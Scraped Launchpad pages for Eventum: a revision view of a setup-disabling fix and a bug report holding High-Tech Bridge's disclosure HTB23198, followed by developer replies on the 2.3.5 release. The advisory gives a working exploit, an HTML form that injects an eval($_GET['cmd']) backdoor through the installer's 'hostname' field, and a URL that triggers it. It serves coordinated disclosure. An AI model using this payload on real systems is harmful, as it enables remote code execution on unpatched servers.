=== Content from bazaar.launchpad.net_94ead55a_20250125_190418.html ===


[← Back to branch summary](https://code.launchpad.net/~eventum-developers/eventum/trunk)
# ~eventum-developers/eventum/trunk

* [Changes](/~eventum-developers/eventum/trunk/changes "Changes")
* [Files](/~eventum-developers/eventum/trunk/files "Files")

[~eventum-developers/eventum/trunk](https://code.launchpad.net/~eventum-developers/eventum/trunk)
» Revision
4666

# Viewing all changes in revision 4666.

* [browse files at revision 4666](/~eventum-developers/eventum/trunk/files/4666 "browse files at revision 4666")
* [compare with another revision](/~eventum-developers/eventum/trunk/revision/4666?remember=4666 "compare with another revision")
* [download diff](/~eventum-developers/eventum/trunk/diff/4666)
* [download tarball](/~eventum-developers/eventum/trunk/tarball/4666)
* [view history from revision 4666](/~eventum-developers/eventum/trunk/changes/4666 "view history from revision 4666")

* **Committer:**
  Elan RuusamÃ¤e
* **Date:**
  2014-01-23 21:59:25 UTC
* **Revision ID:**
  glen@delfi.ee-20140123215925-1zuvh2w815lnx1ta

[CWE-276]Â disableÂ setupÂ whenÂ alreadyÂ configured

+ files modified:
+ [htdocs/setup/index.php](/~eventum-developers/eventum/trunk/revision/4666/htdocs/setup/index.php#htdocs/setup/index.php "View changes to htdocs/setup/index.php in revision 4666")
  \*

![expand all](/static/images/treeCollapsed.png) expand all

![collapse all](/static/images/treeExpanded.png) collapse all

Show diffs side-by-side

![added](/static/images/newCode.gif) added

![removed](/static/images/deleteCode.gif) removed

Lines of Context:

[![](/static/images/treeCollapsed.png)
htdocs/setup/index.php](/~eventum-developers/eventum/trunk/revision/4666/htdocs/setup/index.php "View changes to htdocs/setup/index.php only")

![](/static/images/spinner.gif)

* [Older »](/~eventum-developers/eventum/trunk/revision/5587?start_revid=5588)

Loggerhead is a web-based interface for [Breezy](https://www.breezy-vcs.org/)

Version: 2.0.1



=== Content from bugs.launchpad.net_c6de6cc7_20250125_190420.html ===

[Log in / Register](https://bugs.launchpad.net/eventum/%2Bbug/1271499/%2Blogin)

[![](https://launchpadlibrarian.net/41243495/64.png)](https://launchpad.net/eventum)

## [Eventum](https://launchpad.net/eventum)

* [Overview](https://launchpad.net/eventum)
* [Code](https://code.launchpad.net/eventum)
* [Bugs](https://bugs.launchpad.net/eventum)
* [Blueprints](https://blueprints.launchpad.net/eventum)
* [Translations](https://translations.launchpad.net/eventum)
* [Answers](https://answers.launchpad.net/eventum)

# Eventum Security Vulnerabilities Notification

Bug #1271499 reported by
[htbridge](https://launchpad.net/~advisory)
on 2014-01-22

[256](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [Eventum](https://bugs.launchpad.net/eventum) | Fix Released | High | [Elan Ruusamäe](https://launchpad.net/~glen666) | [Eventum 2.3.5](https://launchpad.net/eventum/%2Bmilestone/2.3.5) |

### Bug Description

Hello,

High-Tech Bridge Security Research Lab has discovered multiple security vulnerabilities in Eventum 2.3.4.

Preview available here: <https://www.htbridge.com/advisory/HTB23198>

Developers can contact us by email advisory (at) htbridge.com for details.

For any questions related to this notification message - please visit our General Information & Disclosure Policy page: <https://www.htbridge.com/advisory/disclosure_policy.html>

Best regards,

High-Tech Bridge Security Research Lab

Tags:

[security](/eventum/%2Bbugs?field.tag=security)
[vulnerability](/eventum/%2Bbugs?field.tag=vulnerability)

## CVE References

* [2014-1631](/bugs/cve/2014-1631 "Eventum before 2.3.5 allows remote at...")
* [2014-1632](/bugs/cve/2014-1632 "htdocs/setup/index.php in Eventum bef...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [htbridge (advisory)](https://launchpad.net/~advisory) wrote on 2014-01-22: |  |  | [#1](/eventum/%2Bbug/1271499/comments/1) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/eventum/%2Bbug/1271499/comments/1/%2Bdownload) (3.7 KiB)

Hello,

High-Tech Bridge Security Research Lab has discovered multiple security vulnerabilities in your product - Eventum.

Detailed description and all available details of the vulnerabilities is provided below in the email.

Please notify us by replying to this email when you release a security update, and provide us if possible with URL of patch/solution so we can add this URL to the advisory.

If you need more time to fix the vulnerabilities - please specify desired Public Disclosure date by replying to this email.

For any questions related to this notification email - please visit our General Information & Disclosure Policy page: <https://www.htbridge.com/advisory/disclosure_policy.html>

If you don't find an answer to your question there - please feel free to contact us by email: <email address hidden>

===============================================================

Advisory ID: HTB23198

Reference: <https://www.htbridge.com/advisory/HTB23198>

Product: Eventum

Vendor: Eventum Development Team

Vulnerable Version(s): 2.3.4 and probably prior

Tested Version: 2.3.4

Public Disclosure: February 12, 2014

Vulnerability Type: Incorrect Default Permissions [CWE-276], Code Injection [CWE-94]

Risk Level: Critical

CVSSv2 Base Scores: 6.4 (AV:N/AC:L/Au:N/C:N/I:P/A:P), 10 (AV:N/AC:L/Au:N/C:C/I:C/A:C)

Discovered and Provided: High-Tech Bridge Security Research Lab ( <https://www.htbridge.com/advisory/> )

Advisory Details:

High-Tech Bridge Security Research Lab discovered vulnerability in Eventum, which can be exploited to reinstall and compromise vulnerable application.

1) Incorrect Default Permissions in Eventum

The vulnerability exists due to incorrect default permission set for installation scripts. Access to installation script located at "/setup/index.php" is not restricted by default and the script is not deleted during the installation process. A remote attacker can access the script and reinstall vulnerable application.

The installation script can be access by a remote unauthenticated user via the following URL:

http://[host]/setup/index.php

2) Code Injection in Eventum

The vulnerability exists due to insufficient sanitization of the HTTP POST parameter "hostname" in "/config/config.php" script during the installation process. A remote attacker can inject and execute arbitrary PHP code on the target system with privileges of the webserver. Successful exploitation requires access to application’s database, which can be achieved by providing address of attacker-controlled MySQL server.

The following exploitation example injects a backdoor into "/config/config.php" file:

<form action="http://[host]/setup/index.php" method="post" name="main">

<input type="hidden" name="cat" value="install">

<input type="hidden" name="hostname" value="'); eval($\_GET['cmd']); $tmp=('">

<input type="hidden" name="relative" value="/">

<input type="hidden" name="db\_hostname" value="db\_hostname">

<input type="hidden" name="db\_name" value="db\_name">

<input type="hidden" name="db\_table\_prefix" value="db\_table\_prefix">

<input type="hidden" name="drop\_tables" value="yes">

<input type="hidden" name="db\_username" value="db\_username">

<input type="hidden" name="se...

[Read more...](/eventum/%2Bbug/1271499/comments/1)

Hello,
High-Tech Bridge Security Research Lab has discovered multiple security vulnerabilities in your product - Eventum.
Detailed description and all available details of the vulnerabilities is provided below in the email.
Please notify us by replying to this email when you release a security update, and provide us if possible with URL of patch/solution so we can add this URL to the advisory.
If you need more time to fix the vulnerabilities - please specify desired Public Disclosure date by replying to this email.
For any questions related to this notification email - please visit our General Information & Disclosure Policy page: https://www.htbridge.com/advisory/disclosure\_policy.html
If you don't find an answer to your question there - please feel free to contact us by email: advisory@htbridge.com
===============================================================
Advisory ID: HTB23198
Reference: https://www.htbridge.com/advisory/HTB23198
Product: Eventum
Vendor: Eventum Development Team
Vulnerable Version(s): 2.3.4 and probably prior
Tested Version: 2.3.4
Public Disclosure: February 12, 2014
Vulnerability Type: Incorrect Default Permissions [CWE-276], Code Injection [CWE-94]
Risk Level: Critical
CVSSv2 Base Scores: 6.4 (AV:N/AC:L/Au:N/C:N/I:P/A:P), 10 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )
Advisory Details:
High-Tech Bridge Security Research Lab discovered vulnerability in Eventum, which can be exploited to reinstall and compromise vulnerable application.
1) Incorrect Default Permissions in Eventum
The vulnerability exists due to incorrect default permission set for installation scripts. Access to installation script located at "/setup/index.php" is not restricted by default and the script is not deleted during the installation process. A remote attacker can access the script and reinstall vulnerable application.
The installation script can be access by a remote unauthenticated user via the following URL:
http://[host]/setup/index.php
2) Code Injection in Eventum
The vulnerability exists due to insufficient sanitization of the HTTP POST parameter "hostname" in "/config/config.php" script during the installation process. A remote attacker can inject and execute arbitrary PHP code on the target system with privileges of the webserver. Successful exploitation requires access to application’s database, which can be achieved by providing address of attacker-controlled MySQL server.
The following exploitation example injects a backdoor into "/config/config.php" file:
<form action="http://[host]/setup/index.php" method="post" name="main">
<input type="hidden" name="cat" value="install">
<input type="hidden" name="hostname" value="'); eval($\_GET['cmd']); $tmp=('">
<input type="hidden" name="relative" value="/">
<input type="hidden" name="db\_hostname" value="db\_hostname">
<input type="hidden" name="db\_name" value="db\_name">
<input type="hidden" name="db\_table\_prefix" value="db\_table\_prefix">
<input type="hidden" name="drop\_tables" value="yes">
<input type="hidden" name="db\_username" value="db\_username">
<input type="hidden" name="setup[smtp][from]" value="email@email.com">
<input type="hidden" name="setup[smtp][host]" value="localhost">
<input type="hidden" name="setup[smtp][port]" value="25">
<input type="hidden" name="" value="">
<input type="submit" id="btn">
</form>
After successful reinstallation an attacker can execute arbitrary PHP code on the system. The following example executes the "phpinfo()" PHP function on the vulnerable system:
http://[host]/index.php?cmd=phpinfo%28%29;
===============================================================
Best regards,
High-Tech Bridge Security Research Lab

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Elan Ruusamäe (glen666)](https://launchpad.net/~glen666) wrote on 2014-01-23: |  |  | [#2](/eventum/%2Bbug/1271499/comments/2) |
| --- | --- | --- | --- |

we have commited:

<http://bazaar.launchpad.net/~eventum-developers/eventum/trunk/revision/4665>

<http://bazaar.launchpad.net/~eventum-developers/eventum/trunk/revision/4666>

2.3.5 release will come out shortly after some testing

we have commited:
http://bazaar.launchpad.net/~eventum-developers/eventum/trunk/revision/4665
http://bazaar.launchpad.net/~eventum-developers/eventum/trunk/revision/4666
2.3.5 release will come out shortly after some testing

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Elan Ruusamäe (glen666)](https://launchpad.net/~glen666) wrote on 2014-01-24: |  |  | [#3](/eventum/%2Bbug/1271499/comments/3) |
| --- | --- | --- | --- |

2.3.5 released

2.3.5 released

| Changed in eventum: | |
| --- | --- |
| **milestone**: | none → 2.3.5 |
| **status**: | New → Fix Released |
| **assignee**: | nobody → Elan Ruusamäe (glen666) |
| **importance**: | Undecided → High |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Bryan Alsdorf (balsdorf)](https://launchpad.net/~balsdorf) wrote on 2014-01-27: |  |  | [#4](/eventum/%2Bbug/1271499/comments/4) |
| --- | --- | --- | --- |

High tech bridge,

we plan on sending out the release announcement Monday, January 27th sometime before 1200GMT. We will be marking this bug public when we do. That should notify you that you can publish the full details on your website.

Thank you for your discovery and report on this.

High tech bridge,
we plan on sending out the release announcement Monday, January 27th sometime before 1200GMT. We will be marking this bug public when we do. That should notify you that you can publish the full details on your website.
Thank you for your discovery and report on this.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [htbridge (advisory)](https://launchpad.net/~advisory) wrote on 2014-01-27: |  |  | [#5](/eventum/%2Bbug/1271499/comments/5) |
| --- | --- | --- | --- |

Hello,

Thank you for your messages.

Advisory was updated:

<https://www.htbridge.com/advisory/HTB23198>

All the best,

High-Tech Bridge Security Research Lab

Hello,
Thank you for your messages.
Advisory was updated:
https://www.htbridge.com/advisory/HTB23198
All the best,
High-Tech Bridge Security Research Lab

[Elan Ruusamäe (glen666)](https://launchpad.net/~glen666)
on 2014-01-27

| **information type**: | Private Security → Public Security |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Elan Ruusamäe (glen666)](https://launchpad.net/~glen666) wrote on 2014-01-27: |  |  | [#6](/eventum/%2Bbug/1271499/comments/6) |
| --- | --- | --- | --- |

news release: [https://launchpad.net/eventum/+announcement/12404](https://launchpad.net/eventum/%2Bannouncement/12404)

mailing list announce: <http://lists.mysql.com/eventum-users/6083>

news release: https://launchpad.net/eventum/+announcement/12404
mailing list announce: http://lists.mysql.com/eventum-users/6083

[See full activity log](https://bugs.launchpad.net/eventum/%2Bbug/1271499/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/eventum/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/eventum/%2Bbug/1271499/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/eventum/%2Bbug/1271499/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/eventum/%2Bbug/1271499/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))


